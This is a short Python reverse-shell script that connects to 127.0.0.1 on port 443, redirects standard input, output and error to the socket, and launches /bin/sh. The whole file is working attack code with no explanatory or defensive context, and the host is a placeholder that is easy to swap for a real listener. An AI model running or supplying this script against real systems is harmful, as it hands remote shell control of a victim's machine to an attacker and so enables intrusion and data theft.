#!/usr/bin/python

import socket, subprocess, os

host = "127.0.0.1"
port = 443
s = socket.socket()
s.connect((host, port))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call("/bin/sh")
